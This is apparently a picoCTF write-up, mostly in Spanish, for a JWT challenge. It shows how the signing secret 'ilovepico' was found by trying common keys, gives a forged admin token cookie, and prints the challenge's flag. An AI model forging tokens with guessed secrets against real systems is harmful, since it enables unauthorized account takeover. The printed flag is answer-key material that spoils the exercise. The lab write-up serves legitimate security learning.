## Descripción

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

Hints:
1. What is that cookie?
2. Have you heard of JWT?
## Solución 

En ([JWT](https://jwt.io/)]:
~~~
Decoded:
{
  "typ": "JWT",
  "alg": "HS256"
}

Payload:
{
  "user": "admin"
}

Verify Signature:
ilovepico
~~~

~~~
Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
~~~

~~~
picoCTF{jawt_was_just_what_you_thought_44c752f5}
~~~
## Notas adicionales 

El sitio usaba un token JWT en una cookie para identificar al usuario. Decodificamos el token y notamos que el algoritmo era HS256 y el payload contenía `"user": "angel"`. Probamos firmar un nuevo token usando la clave `ilovepico` y con `"user": admin`, que descubrimos al probar claves comunes. Al enviar el token manipulado como cookie, el sistema nos dio acceso como administrador y reveló la bandera.
## Referencias

